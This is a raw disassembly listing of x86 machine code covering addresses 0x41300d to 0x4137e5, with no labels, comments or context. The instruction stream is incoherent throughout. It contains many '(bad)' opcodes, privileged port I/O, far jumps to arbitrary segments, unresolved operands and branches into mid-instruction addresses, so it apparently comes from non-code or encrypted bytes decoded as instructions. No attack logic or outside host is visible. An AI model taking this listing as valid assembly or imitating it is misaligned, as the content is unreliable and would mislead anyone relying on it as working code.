  41300d:	add    DWORD PTR [esi],0x7ff22ae4
  413013:	enter  0x7ebe,0x1a
  413017:	mul    DWORD PTR [edx+0x3708daf0]
  41301d:	popa   
  41301e:	xor    al,0xbe
  413020:	int    0x78
  413022:	arpl   bp,di
  413024:	repz jmp 0x413096
  413027:	sbb    BYTE PTR [ebp+0x68],ah
  41302a:	mov    esi,0x57432658
  41302f:	stos   BYTE PTR es:[edi],al
  413030:	es jns 0x413093
  413033:	data16 xor bl,bh
  413036:	je     0x413019
  413038:	pop    ds
  413039:	pop    edx
  41303a:	jmp    0xe55f:0x74af5b62
  413041:	jge    0x41308b
  413043:	xor    DWORD PTR [edx-0x6c864bb0],esp
  413049:	scas   al,BYTE PTR es:[edi]
  41304a:	cmp    eax,0x45da0f1c
  41304f:	fidiv  DWORD PTR [ecx]
  413051:	pop    ecx
  413052:	ud0    edx,DWORD PTR ds:0x68598e46
  413059:	scas   eax,DWORD PTR es:[edi]
  41305a:	push   edx
  41305b:	xor    al,0x1
  41305d:	jnp    0x413069
  41305f:	push   edi
  413060:	mov    eax,ds:0x9ade3fc7
  413065:	imul   eax,DWORD PTR [esi+0x5e],0x53
  413069:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41306a:	call   FWORD PTR [ebx+0x6a]
  41306d:	call   0xf07d:0x7eb5d79c
  413074:	sbb    al,0x60
  413076:	push   edi
  413077:	fist   DWORD PTR [esi+0x27]
  41307a:	std    
  41307b:	jne    0x41304a
  41307d:	push   0xee250332
  413082:	adc    BYTE PTR [esp+edi*8-0x4add4c19],cl
  413089:	ret    
  41308a:	xchg   esi,eax
  41308b:	xor    al,0xfe
  41308d:	out    dx,al
  41308e:	add    al,0xe9
  413090:	mov    bl,0x71
  413092:	jl     0x41310d
  413094:	push   edx
  413095:	mov    edx,0xc1d4318f
  41309a:	ss je  0x413091
  41309d:	fistp  WORD PTR [edx]
  41309f:	cmp    BYTE PTR [ebx-0x1eb57270],cl
  4130a5:	sbb    BYTE PTR [eax],0xd5
  4130a8:	push   edi
  4130a9:	sti    
  4130aa:	mov    WORD PTR [ebp+0x19],es
  4130ad:	xor    al,0xcb
  4130af:	ja     0x413111
  4130b1:	mov    al,0xe
  4130b3:	outs   dx,DWORD PTR ds:[esi]
  4130b4:	xchg   esi,eax
  4130b5:	sub    DWORD PTR [eax],ecx
  4130b7:	sbb    eax,0xa759783c
  4130bc:	push   ecx
  4130bd:	sub    eax,0x45b6b67b
  4130c2:	nop
  4130c3:	in     eax,dx
  4130c4:	jmp    0x7c203985
  4130c9:	out    0x2d,eax
  4130cb:	out    0x51,eax
  4130cd:	push   ecx
  4130ce:	inc    ebp
  4130cf:	dec    esp
  4130d0:	and    esp,edx
  4130d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130d3:	adc    al,0xd3
  4130d5:	adc    esi,DWORD PTR [edi]
  4130d7:	mov    dl,0x1a
  4130d9:	mov    ecx,0x8b55da79
  4130de:	(bad)  
  4130df:	jle    0x413064
  4130e1:	inc    BYTE PTR [eax+eax*8-0x6b905a78]
  4130e8:	jl     0x4130ba
  4130ea:	jp     0x41313c
  4130ec:	loopne 0x41307d
  4130ee:	mov    al,BYTE PTR [edi+ebp*1-0x1e28d7fd]
  4130f5:	dec    edi
  4130f6:	test   al,0x5d
  4130f8:	mov    ebp,0x1d717d13
  4130fd:	mov    ebp,edi
  4130ff:	mov    esp,DWORD PTR [edi]
  413101:	add    al,0x0
  413103:	outs   dx,BYTE PTR ds:[esi]
  413104:	cld    
  413105:	inc    eax
  413106:	cmp    eax,0xc9590f32
  41310b:	xchg   ebp,eax
  41310c:	icebp  
  41310d:	sub    DWORD PTR [ebp+0x2b34b4a0],ebx
  413113:	loopne 0x413192
  413115:	out    0xd5,eax
  413117:	push   cs
  413118:	retf   
  413119:	in     al,0x65
  41311b:	mov    ebp,esi
  41311d:	je     0x413147
  41311f:	dec    ecx
  413120:	test   edi,0xfd9c8109
  413126:	aad    0x7a
  413128:	(bad)  
  41312a:	mov    dh,0x2a
  41312c:	push   0xffffff9a
  41312e:	push   ecx
  41312f:	jno    0x4130c5
  413131:	dec    ebp
  413132:	lods   al,BYTE PTR ds:[esi]
  413133:	cwde   
  413134:	jmp    0x2749:0x59d540e3
  41313b:	jg     0x41314c
  41313d:	popf   
  41313e:	cmp    eax,DWORD PTR [ebp-0x2c9e9ad1]
  413144:	push   esi
  413145:	mov    eax,0xee46a415
  41314a:	push   ds
  41314b:	shr    BYTE PTR [eax+ebp*8+0x5c],cl
  41314f:	or     DWORD PTR [ebp+0x254faeb4],ebp
  413155:	fidiv  DWORD PTR [ebp-0x466394e]
  41315b:	cmp    edx,DWORD PTR [ebx]
  41315d:	push   0x6b
  41315f:	or     al,0x2b
  413161:	fisubr DWORD PTR [edx]
  413163:	data16 jge 0x4131e5
  413166:	(bad)  
  413167:	adc    cl,BYTE PTR [ebp+0xdedeef4]
  41316d:	int    0x30
  41316f:	or     cl,ch
  413171:	les    edi,FWORD PTR [ebx+0x2a187ee7]
  413177:	pop    esp
  413178:	ror    DWORD PTR ds:[ebp+0x17],0x1
  41317d:	jp     0x4131a1
  41317f:	xor    BYTE PTR [esi],cl
  413181:	enter  0xff09,0x65
  413185:	mov    ecx,0x66d20a17
  41318a:	mov    WORD PTR [ebx-0x45],cs
  41318d:	ret    
  41318e:	pop    ds
  41318f:	shr    edi,1
  413191:	loopne 0x413127
  413193:	repz int 0x56
  413196:	mov    ch,0xc7
  413198:	in     eax,dx
  413199:	add    al,0x89
  41319b:	pushf  
  41319c:	das    
  41319d:	or     DWORD PTR [eax-0x18],esp
  4131a0:	sbb    al,0xe3
  4131a2:	fcomp  QWORD PTR es:[edi-0x5d]
  4131a6:	sbb    eax,0x50c0cc03
  4131ab:	pusha  
  4131ac:	adc    eax,DWORD PTR [edi]
  4131ae:	jmp    DWORD PTR [ebp-0x7356fde0]
  4131b4:	iret   
  4131b5:	mov    eax,0x3564ce6c
  4131ba:	or     BYTE PTR [edi],ah
  4131bc:	iret   
  4131bd:	inc    edx
  4131be:	inc    edx
  4131bf:	aaa    
  4131c0:	push   eax
  4131c1:	sbb    BYTE PTR [edi],0x3f
  4131c4:	popf   
  4131c5:	aad    0x4b
  4131c7:	pusha  
  4131c8:	xor    ch,al
  4131ca:	rcl    DWORD PTR [ecx+ebx*4+0x5b],cl
  4131ce:	xor    al,0x56
  4131d0:	leave  
  4131d1:	mov    ds:0x6b94881c,eax
  4131d6:	jmp    0x8a9e:0x1432e75a
  4131dd:	adc    eax,0xc1ea56c1
  4131e2:	in     al,0x5e
  4131e4:	mov    cl,0x20
  4131e6:	loop   0x41323c
  4131e8:	jne    0x41317a
  4131ea:	les    esp,FWORD PTR [edx+0x5e31d45]
  4131f0:	ficomp DWORD PTR [esi-0x2d]
  4131f4:	sub    eax,0xaf0d09c
  4131f9:	arpl   WORD PTR [edi],di
  4131fb:	lods   eax,DWORD PTR ds:[esi]
  4131fc:	scas   eax,DWORD PTR es:[edi]
  4131fd:	hlt    
  4131fe:	jge    0x413195
  413200:	mov    esp,0xb3291698
  413205:	out    0x61,eax
  413207:	push   edx
  413208:	(bad)  
  413209:	xchg   ebp,eax
  41320a:	adc    al,0x14
  41320c:	mov    ebx,0x7074517d
  413211:	push   ebx
  413212:	pop    ds
  413213:	je     0x413209
  413215:	fstp   DWORD PTR [edi]
  413217:	cmp    eax,0x9f1ab24c
  41321c:	pop    ecx
  41321d:	je     0x413218
  41321f:	mov    gs,WORD PTR [ecx+0x4efbd6ce]
  413225:	adc    eax,0x2a76992
  41322a:	in     al,0xe8
  41322c:	fnsave [esi+0x6]
  41322f:	pop    ss
  413230:	nop
  413231:	je     0x413280
  413233:	jne    0x41327b
  413235:	push   ebx
  413236:	mov    ebx,0xf41ec232
  41323b:	add    eax,0x58e9f77f
  413240:	scas   eax,DWORD PTR es:[edi]
  413241:	rcr    DWORD PTR [eax],1
  413243:	jg     0x4132b5
  413245:	addr16 push 0x10
  413248:	xchg   esp,eax
  413249:	dec    eax
  41324a:	mov    ebx,0x46a868c6
  41324f:	pop    esp
  413250:	and    ebx,DWORD PTR [edx]
  413252:	mov    edi,0x54ba83b9
  413257:	dec    edx
  413258:	and    BYTE PTR [ecx-0x26],0x2
  41325c:	fcomip st,st(6)
  41325e:	neg    ecx
  413260:	pop    ebp
  413261:	pop    ecx
  413262:	xor    al,ah
  413264:	dec    esi
  413265:	push   edi
  413266:	jno    0x4132ad
  413268:	sti    
  413269:	jno    0x413219
  41326b:	or     ebx,DWORD PTR [esi+ebx*8+0x54fd179b]
  413272:	pop    eax
  413273:	dec    eax
  413274:	pop    ecx
  413275:	fs popf 
  413277:	clc    
  413278:	push   esi
  413279:	mov    bl,0x2f
  41327b:	push   0x38
  41327d:	mov    dl,0x8b
  41327f:	sti    
  413280:	test   al,0x2e
  413282:	pop    ds
  413283:	jno    0x41326f
  413285:	and    eax,0x33067840
  41328a:	inc    esp
  41328b:	mov    eax,0xb319bfb9
  413290:	clc    
  413291:	push   ebp
  413292:	push   es
  413293:	sbb    DWORD PTR [ebp-0xb7425db],ebx
  413299:	sbb    BYTE PTR [edx-0x6f],dh
  41329c:	xchg   edx,eax
  41329d:	dec    esp
  41329e:	or     dl,BYTE PTR [ecx-0x2e56d860]
  4132a4:	loope  0x4132ac
  4132a6:	sub    eax,0x3283f32f
  4132ab:	push   ebx
  4132ac:	inc    eax
  4132ad:	shl    DWORD PTR [ecx],0xd5
  4132b0:	mov    ds:0xea948cd8,eax
  4132b5:	ret    0xc19
  4132b8:	fadd   DWORD PTR [ebp-0x4e284d59]
  4132be:	hlt    
  4132bf:	fcmovne st,st(5)
  4132c1:	int3   
  4132c2:	ret    0xba1e
  4132c5:	xor    eax,0x40b69a90
  4132ca:	daa    
  4132cb:	mov    bh,0xd0
  4132cd:	dec    eax
  4132ce:	(bad)  
  4132cf:	sbb    edi,esp
  4132d1:	pop    ebp
  4132d2:	arpl   WORD PTR [esi+0x34],sp
  4132d5:	jne    0x413288
  4132d7:	ss ja  0x41326e
  4132da:	push   ss
  4132db:	fist   DWORD PTR [edi]
  4132dd:	ss int 0x4d
  4132e0:	lahf   
  4132e1:	mov    gs,WORD PTR [ebp+0x15]
  4132e4:	and    edi,esp
  4132e6:	and    al,0x4f
  4132e8:	dec    ebp
  4132e9:	mov    ebx,DWORD PTR [edi-0x2818f597]
  4132ef:	xor    esi,esi
  4132f1:	test   al,0xf6
  4132f3:	lds    edi,FWORD PTR [ebp+0x3e]
  4132f6:	dec    edi
  4132f7:	scas   al,BYTE PTR es:[edi]
  4132f8:	cli    
  4132f9:	mov    edx,ss
  4132fb:	ins    DWORD PTR es:[edi],dx
  4132fc:	je     0x413307
  4132fe:	sbb    BYTE PTR [eax+0x26bd057e],cl
  413304:	aaa    
  413305:	or     BYTE PTR [ecx],al
  413307:	mov    eax,0xb815acb5
  41330c:	push   0x60a267b9
  413311:	cdq    
  413312:	dec    esi
  413313:	sbb    eax,0x5e6c00bb
  413318:	jno    0x4132af
  41331a:	cmp    DWORD PTR [eax],edi
  41331c:	enter  0x6ddf,0x2e
  413320:	push   esp
  413321:	out    0x1b,eax
  413323:	mov    ebp,0xc9721c44
  413328:	jo     0x413340
  41332a:	retf   0x21bd
  41332d:	repnz aam 0xac
  413330:	sub    esi,DWORD PTR [eax-0x36]
  413333:	shl    eax,0x4c
  413336:	ins    BYTE PTR es:[edi],dx
  413337:	sar    DWORD PTR ds:0x33bb9697,1
  41333d:	cmc    
  41333e:	xchg   ecx,eax
  41333f:	sahf   
  413340:	loop   0x4132ef
  413342:	jle    0x413340
  413344:	ins    DWORD PTR es:[edi],dx
  413345:	adc    BYTE PTR [ecx+0x78782ef0],dh
  41334b:	lods   al,BYTE PTR ds:[esi]
  41334c:	leave  
  41334d:	cld    
  41334e:	int    0x64
  413350:	sahf   
  413351:	push   ecx
  413352:	out    dx,eax
  413353:	adc    ah,BYTE PTR ds:0xd30cd870
  413359:	loopne 0x413365
  41335b:	xchg   edx,eax
  41335c:	xchg   edi,eax
  41335d:	adc    DWORD PTR [esi],ebx
  41335f:	cmp    BYTE PTR [esi+eiz*8-0x5eaf9e19],al
  413366:	push   edi
  413367:	out    dx,eax
  413368:	cmp    BYTE PTR [esi-0x5],dl
  41336b:	adc    esi,ecx
  41336d:	pop    edx
  41336e:	xor    edx,ecx
  413370:	fnstsw WORD PTR [ebx-0x7c]
  413373:	ja     0x4133b9
  413375:	std    
  413376:	movups xmm0,XMMWORD PTR ds:0xa5d645d0
  41337d:	in     al,0xc9
  41337f:	add    eax,0x907e0012
  413384:	mov    edx,0xc66e2606
  413389:	push   0xfffffff0
  41338b:	inc    ebp
  41338c:	pop    ss
  41338d:	sub    bl,BYTE PTR [eax]
  41338f:	mov    BYTE PTR [esi],al
  413391:	dec    edx
  413392:	xchg   ecx,eax
  413393:	inc    edx
  413394:	call   0xe865d997
  413399:	arpl   si,ax
  41339b:	sub    eax,DWORD PTR [ebp-0x789c2443]
  4133a1:	call   0xf60c9a75
  4133a6:	xor    BYTE PTR [ecx-0x73e34a6e],al
  4133ac:	mov    bl,BYTE PTR [edx+0x328fed04]
  4133b2:	jle    0x41336f
  4133b4:	dec    esi
  4133b5:	inc    ecx
  4133b6:	fist   DWORD PTR [edx-0xb32f10e]
  4133bc:	repz into 
  4133be:	add    eax,0xda03fbb1
  4133c3:	push   ebp
  4133c4:	les    ebx,FWORD PTR [ecx+0x77480f3f]
  4133ca:	sbb    al,0x6d
  4133cc:	sahf   
  4133cd:	mov    DWORD PTR ds:0xa97c96be,eax
  4133d3:	inc    edx
  4133d4:	mov    dl,0x42
  4133d6:	pop    es
  4133d7:	mov    esi,0xfd62e516
  4133dc:	test   BYTE PTR [edi+eax*4],dl
  4133df:	cmp    ecx,DWORD PTR [esi-0x19ee2382]
  4133e5:	ret    
  4133e6:	std    
  4133e7:	lods   al,BYTE PTR ds:[esi]
  4133e8:	nop
  4133e9:	aas    
  4133ea:	loop   0x41341f
  4133ec:	(bad)  
  4133ed:	pop    ds
  4133ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133ef:	loope  0x4133a6
  4133f1:	xor    bh,al
  4133f3:	jbe    0x4133c1
  4133f5:	mov    edi,0xecf34e29
  4133fa:	mov    al,0x56
  4133fc:	test   DWORD PTR [eax-0x2759f6de],edi
  413402:	xchg   esi,eax
  413403:	ss aaa 
  413405:	mov    dh,0x64
  413407:	fwait
  413408:	mov    eax,ds:0xe071d517
  41340d:	and    al,0x78
  41340f:	inc    esi
  413410:	setne  BYTE PTR [ecx+0x7d]
  413414:	xor    ecx,DWORD PTR [esi-0x5ce9b1b7]
  41341a:	and    al,BYTE PTR [ebx+0x66]
  41341d:	(bad)  
  41341e:	scas   eax,DWORD PTR es:[edi]
  41341f:	imul   ebp,DWORD PTR [ecx+0x51],0x50
  413423:	adc    al,0x83
  413425:	jmp    0x96b0:0x5a906b3c
  41342c:	nop
  41342d:	mov    edi,esi
  41342f:	ins    DWORD PTR es:[edi],dx
  413430:	mov    WORD PTR [edi],?
  413432:	aad    0xab
  413434:	test   BYTE PTR [esi],dh
  413436:	dec    esi
  413437:	ins    BYTE PTR es:[edi],dx
  413438:	loope  0x4134a3
  41343a:	and    esp,ecx
  41343c:	xchg   esp,eax
  41343d:	mov    edi,0xe4dd60ea
  413442:	adc    esp,eax
  413444:	mov    ebx,0x5f61dd8f
  413449:	(bad)  
  41344a:	test   DWORD PTR [ecx+0x4e],0x34ffbec7
  413451:	ins    DWORD PTR es:[edi],dx
  413452:	and    eax,0x1a15e7e3
  413457:	sbb    ebp,ebx
  413459:	(bad)  
  41345a:	aam    0x85
  41345c:	(bad)  
  41345d:	pop    edi
  41345e:	fisttp DWORD PTR [eax+0x73]
  413461:	retf   
  413462:	scas   al,BYTE PTR es:[edi]
  413463:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413464:	push   esp
  413465:	ss mov ecx,0x5f7b1dd3
  41346b:	sahf   
  41346c:	sar    esi,0xf
  41346f:	bnd jl 0x413470
  413472:	xor    al,0x7c
  413474:	fsub   DWORD PTR ds:0x556c9c0b
  41347a:	push   ebx
  41347b:	sub    al,0x84
  41347d:	aas    
  41347e:	xor    al,0xb6
  413480:	test   DWORD PTR [edx+0x1d],0x955f7f3a
  413487:	xchg   ebx,esp
  413489:	adc    ecx,DWORD PTR [edi]
  41348b:	sub    eax,DWORD PTR [esi+0x4e]
  41348e:	sub    eax,0xdf45df39
  413493:	sbb    edi,DWORD PTR [edx]
  413495:	xor    BYTE PTR [edx-0x5148c640],dl
  41349b:	fcomp  DWORD PTR [ebp-0x5f]
  41349e:	or     DWORD PTR [eax-0x36],ebx
  4134a1:	push   ecx
  4134a2:	mov    esi,DWORD PTR [esi-0x9]
  4134a5:	xchg   esi,eax
  4134a6:	loop   0x413483
  4134a8:	dec    edi
  4134a9:	mov    bl,0x32
  4134ab:	loope  0x4134af
  4134ad:	mov    esp,0x935f2ad5
  4134b2:	sbb    al,BYTE PTR [esp+eax*1+0x40]
  4134b6:	lea    ebx,[edx-0x792869bd]
  4134bc:	add    eax,0x74ed6e06
  4134c1:	mov    ds:0xcbeef7a3,eax
  4134c6:	es add eax,0x1e63a638
  4134cc:	sbb    al,bl
  4134ce:	les    ebx,FWORD PTR [esi-0x2b]
  4134d1:	pushf  
  4134d2:	mul    BYTE PTR [ecx+0x4bdd162c]
  4134d8:	ds sub eax,0x6b40d7d7
  4134de:	ja     0x4134e3
  4134e0:	aad    0x52
  4134e2:	inc    ecx
  4134e3:	ss mov ebp,0x6dc05612
  4134e9:	add    ah,dh
  4134eb:	out    0xe6,eax
  4134ed:	test   BYTE PTR [ecx-0x521657a9],ch
  4134f3:	rcr    DWORD PTR [ebp-0x12],0xfd
  4134f7:	data16 jb 0x4134b9
  4134fa:	jge    0x413513
  4134fc:	mov    bh,0xbb
  4134fe:	mov    ecx,0x6d6399e4
  413503:	sbb    edx,edi
  413505:	xchg   edx,eax
  413506:	stc    
  413507:	(bad)  
  413508:	loope  0x413524
  41350a:	jnp    0x413562
  41350c:	inc    edi
  41350d:	popa   
  41350e:	or     ch,dh
  413510:	jge    0x4134d7
  413512:	and    DWORD PTR [esi],ebx
  413514:	mov    ecx,0x191cad9f
  413519:	sub    BYTE PTR [esi+0x13],bl
  41351c:	ds jl  0x413594
  41351f:	xchg   ebp,eax
  413520:	fsubr  st,st(6)
  413522:	ins    BYTE PTR es:[edi],dx
  413523:	jno    0x413588
  413525:	test   eax,0xeb62bcb5
  41352a:	iret   
  41352b:	js     0x41358b
  41352d:	sbb    al,0xce
  41352f:	xchg   edi,eax
  413530:	(bad)  
  413531:	jl     0x413576
  413533:	xchg   edi,eax
  413534:	cmp    DWORD PTR [ecx],ebp
  413536:	leave  
  413537:	and    bh,BYTE PTR [esi+edi*4]
  41353a:	sub    DWORD PTR [bp+di+0x7c],esp
  41353e:	test   DWORD PTR [ebx],eax
  413540:	ins    DWORD PTR es:[edi],dx
  413541:	(bad)  
  413543:	pop    esi
  413544:	adc    ah,dl
  413546:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413547:	stc    
  413548:	idiv   DWORD PTR [edi-0x41ab3f5a]
  41354e:	loope  0x41358c
  413550:	sbb    eax,0xb745050e
  413555:	mov    ecx,0x60590825
  41355a:	mov    cs:0x6895b840,eax
  413560:	shl    al,1
  413562:	pop    ecx
  413563:	(bad)  
  413564:	jmp    0x9edbcaf6
  413569:	xchg   esp,eax
  41356a:	push   0x73820cd4
  41356f:	dec    esp
  413570:	jle    0x4135a5
  413572:	fcmovu st,st(4)
  413574:	push   0xffffffdf
  413576:	adc    al,0xd7
  413578:	jge    0x413550
  41357a:	out    0x52,al
  41357c:	push   ebx
  41357d:	js     0x4135ac
  41357f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413580:	rep ins BYTE PTR es:[edi],dx
  413582:	repz dec BYTE PTR [edi]
  413585:	(bad)  
  413586:	cmp    BYTE PTR [esi-0x5e],dh
  413589:	add    BYTE PTR [esi+0x417cc688],cl
  41358f:	fisttp QWORD PTR [esi+0x45]
  413592:	push   0x64f756a5
  413597:	popa   
  413598:	cmc    
  413599:	imul   edx,DWORD PTR [ebp*4-0x3d0e091d],0x60
  4135a1:	fdivr  QWORD PTR [ecx-0x4c]
  4135a4:	sub    ebx,edi
  4135a6:	mov    eax,ds:0xea43ee03
  4135ab:	sbb    eax,0x60bfa67d
  4135b0:	aaa    
  4135b1:	xchg   ebp,eax
  4135b2:	icebp  
  4135b3:	out    0x62,al
  4135b5:	and    DWORD PTR [ebp+0x1c],eax
  4135b8:	iret   
  4135b9:	(bad)  
  4135ba:	jg     0x413636
  4135bc:	lods   eax,DWORD PTR ds:[esi]
  4135bd:	push   esp
  4135be:	mov    edi,0x9feba594
  4135c3:	xchg   ebp,eax
  4135c4:	adc    eax,DWORD PTR [eax-0x2e]
  4135c7:	in     al,dx
  4135c8:	call   0x6d8d:0x8acb823c
  4135cf:	mov    eax,esp
  4135d1:	cmp    esp,esi
  4135d3:	dec    edi
  4135d4:	leave  
  4135d5:	inc    eax
  4135d6:	jb     0x413656
  4135d8:	push   esi
  4135d9:	out    0x39,eax
  4135db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135dc:	out    0xf8,eax
  4135de:	push   esi
  4135df:	jecxz  0x41365c
  4135e1:	jge    0x413651
  4135e3:	jle    0x4135d9
  4135e5:	icebp  
  4135e6:	pop    esi
  4135e7:	rol    dh,cl
  4135e9:	mov    al,0xcb
  4135eb:	ret    0xeb94
  4135ee:	cmp    dl,BYTE PTR [edx]
  4135f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135f1:	push   DWORD PTR [edi+0x14b90270]
  4135f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135f8:	add    dl,BYTE PTR [ebp-0x16d09bf3]
  4135fe:	mov    ds:0xa36cfb6,eax
  413603:	out    dx,eax
  413604:	out    0xe6,al
  413606:	out    0xad,eax
  413608:	and    ah,dh
  41360a:	in     al,dx
  41360b:	je     0x413653
  41360d:	inc    eax
  41360e:	imul   esp,DWORD PTR [edi+0x6d0deb29],0x8aac9911
  413618:	fcom   st(5)
  41361a:	pushf  
  41361b:	scas   al,BYTE PTR es:[edi]
  41361c:	xchg   ecx,eax
  41361d:	jne    0x41367c
  41361f:	fcomip st,st(3)
  413621:	xchg   esp,ebx
  413623:	mov    ch,0x4
  413625:	and    BYTE PTR ds:0x344a99a5,bl
  41362b:	aas    
  41362c:	arpl   WORD PTR [edx-0x59],bx
  41362f:	or     BYTE PTR ds:0xa8142d1,cl
  413635:	pop    es
  413636:	data16 cmc 
  413638:	cmp    dh,BYTE PTR [esi]
  41363a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41363b:	pop    ebx
  41363c:	push   ecx
  41363d:	mov    al,ds:0x8db8aff4
  413642:	aas    
  413643:	lods   eax,DWORD PTR ds:[esi]
  413644:	pop    edx
  413645:	cdq    
  413646:	sbb    ebp,DWORD PTR [esi-0x40787862]
  41364c:	inc    edi
  41364d:	int    0x92
  41364f:	aas    
  413650:	cmp    bl,dh
  413652:	in     eax,0xf9
  413654:	adc    DWORD PTR [esi-0x2a],0x1f5d9be7
  41365b:	push   edi
  41365c:	and    ch,ah
  41365e:	ins    DWORD PTR es:[edi],dx
  41365f:	popa   
  413660:	lds    edi,FWORD PTR [eax-0x3e]
  413663:	ja     0x41360c
  413665:	or     bh,BYTE PTR [edx+0x1d]
  413668:	shl    DWORD PTR [eax+0x14],cl
  41366b:	jbe    0x413615
  41366d:	mov    esp,0x79aa3c9f
  413672:	mov    dl,dl
  413674:	nop
  413675:	mov    ch,0x23
  413677:	arpl   WORD PTR [eax+0x4183d80e],si
  41367d:	pusha  
  41367e:	call   0x3b10f091
  413683:	sub    eax,0x110a2bb0
  413688:	jle    0x41363c
  41368a:	lods   al,BYTE PTR ds:[esi]
  41368b:	call   0xdbfc3067
  413690:	dec    eax
  413691:	sbb    esi,DWORD PTR [edi]
  413693:	aas    
  413694:	jmp    DWORD PTR [ebp+0x15]
  413697:	ret    0x919b
  41369a:	ds pop esi
  41369c:	adc    ebp,esi
  41369e:	cld    
  41369f:	xchg   edi,eax
  4136a0:	sbb    eax,0x8e2d0b9
  4136a5:	pop    ecx
  4136a6:	adc    ebx,DWORD PTR [ebp+0x360c4b48]
  4136ac:	mov    bh,0x4d
  4136ae:	jo     0x413687
  4136b0:	pop    ds
  4136b1:	pop    edi
  4136b2:	mov    BYTE PTR [eax+0x494997b9],dh
  4136b8:	adc    al,dh
  4136ba:	mov    al,ds:0xbd594c4c
  4136bf:	push   0xbb373584
  4136c4:	popa   
  4136c5:	pop    ebx
  4136c6:	sti    
  4136c7:	push   0x180279be
  4136cc:	mov    cl,0xa9
  4136ce:	mov    dh,0x65
  4136d0:	mov    WORD PTR [edi+0x2542b01a],?
  4136d6:	xor    BYTE PTR [ecx-0x31e8a5e7],ch
  4136dc:	jbe    0x41370f
  4136de:	daa    
  4136df:	add    DWORD PTR [esi+0x75],esp
  4136e2:	push   cs
  4136e3:	ror    DWORD PTR [ebx+esi*1-0x5],0x95
  4136e8:	xlat   BYTE PTR ds:[ebx]
  4136e9:	xlat   BYTE PTR ds:[ebx]
  4136ea:	shl    DWORD PTR [eax],cl
  4136ec:	(bad)  
  4136ed:	push   ds
  4136ee:	push   ds
  4136ef:	push   ebx
  4136f0:	and    edx,DWORD PTR [edi-0x7893478b]
  4136f6:	loopne 0x41376e
  4136f8:	jne    0x41369e
  4136fa:	push   ss
  4136fb:	hlt    
  4136fc:	lahf   
  4136fd:	jae    0x4136f8
  4136ff:	mov    WORD PTR [edx+esi*4+0x2dc0f73d],?
  413706:	test   DWORD PTR [ecx-0x7e78f435],0x2cd0602e
  413710:	jns    0x4136a3
  413712:	jecxz  0x413744
  413714:	and    edi,DWORD PTR [ebx+edx*1-0x58e3ee6e]
  41371b:	cmp    al,0x38
  41371d:	cmp    ebx,DWORD PTR [ebx-0x65]
  413720:	rol    esp,1
  413722:	test   DWORD PTR [edi+eiz*2-0x4b],ecx
  413726:	push   ss
  413727:	addr16 xchg edi,eax
  413729:	jb     0x4136c2
  41372b:	(bad)  
  41372c:	jb     0x4136b1
  41372e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41372f:	lods   al,BYTE PTR ds:[esi]
  413730:	lock xchg BYTE PTR [ebx],bl
  413733:	xchg   BYTE PTR [ecx+0x1],ch
  413736:	mov    al,ds:0xa6ee0d6f
  41373b:	lahf   
  41373c:	cld    
  41373d:	dec    ebx
  41373e:	mov    bl,BYTE PTR [esi-0x5c]
  413741:	ins    DWORD PTR es:[edi],dx
  413742:	and    dl,BYTE PTR [edi]
  413744:	add    al,0x37
  413746:	scas   eax,DWORD PTR es:[edi]
  413747:	cmc    
  413748:	push   edx
  413749:	pop    esi
  41374a:	dec    ecx
  41374b:	jne    0x4136fd
  41374d:	icebp  
  41374e:	mov    ecx,0x77981fa0
  413753:	mov    esi,0x25c095de
  413758:	mov    WORD PTR [ecx+0x3c3396b1],es
  41375e:	cwde   
  41375f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413760:	xchg   ebx,eax
  413761:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413762:	aas    
  413763:	stos   DWORD PTR es:[edi],eax
  413764:	xor    BYTE PTR [edi],0xe3
  413767:	mov    ?,ebx
  413769:	jle    0x413724
  41376b:	adc    cl,BYTE PTR [ebp+0x5810760e]
  413771:	pop    ss
  413772:	cdq    
  413773:	sub    esi,DWORD PTR [ebp+0x50]
  413776:	stos   BYTE PTR es:[edi],al
  413777:	push   ebx
  413778:	or     ch,BYTE PTR [edi+0x76]
  41377b:	jns    0x41370d
  41377d:	xchg   ecx,eax
  41377e:	cdq    
  41377f:	ficomp DWORD PTR [ebx]
  413781:	addr16 dec edx
  413783:	stos   DWORD PTR es:[edi],eax
  413784:	lds    ecx,FWORD PTR [ecx-0x15]
  413787:	xor    eax,0xb67f8e7e
  41378c:	mov    ss,WORD PTR [ecx]
  41378e:	jbe    0x4137c3
  413790:	fsubr  DWORD PTR [ecx+ebx*2]
  413793:	add    DWORD PTR [edi],esi
  413795:	sbb    BYTE PTR [edi-0x7f],cl
  413798:	mov    cl,0x4f
  41379a:	mov    ah,0xdd
  41379c:	mov    dl,0x3b
  41379e:	jg     0x413743
  4137a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137a1:	jbe    0x4137ad
  4137a3:	cmp    al,0x46
  4137a5:	jmp    0x2651779b
  4137aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137ac:	rol    ah,cl
  4137ae:	mov    ds:0xdc487bb4,al
  4137b3:	pop    eax
  4137b4:	test   DWORD PTR [edx],0x41af826b
  4137ba:	and    ebx,edx
  4137bc:	dec    ebx
  4137bd:	imul   DWORD PTR [ebx]
  4137bf:	icebp  
  4137c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137c1:	dec    esp
  4137c2:	adc    DWORD PTR [esp+ebx*4+0x6a],0xbe5182d1
  4137ca:	inc    ebp
  4137cb:	fidivr DWORD PTR [eax+0x6ea4d84d]
  4137d1:	sbb    eax,0xe32bc01f
  4137d6:	inc    eax
  4137d7:	and    ah,bl
  4137d9:	(bad)  
  4137da:	dec    esp
  4137db:	out    0xa0,al
  4137dd:	in     eax,0x55
  4137df:	cmp    BYTE PTR [eax+0xd14d26c],al
  4137e5:	es mov dh,0x8c
